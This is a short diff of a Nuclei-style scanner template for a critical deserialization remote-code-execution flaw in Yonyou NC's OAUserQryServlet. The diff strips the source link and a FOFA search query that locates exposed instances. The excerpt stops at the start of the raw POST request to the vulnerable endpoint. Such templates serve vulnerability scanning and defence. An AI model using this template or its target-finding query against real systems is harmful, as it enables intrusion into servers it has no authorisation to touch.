@@ -3,12 +3,8 @@ info:
   name: 用友NC-OAUserQryServlet存在反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bdadx58h5gi5t7lw'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bdadx58h5gi5t7lw
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'POST /servlet/OAUserQryServlet?pageId=login HTTP/1.1
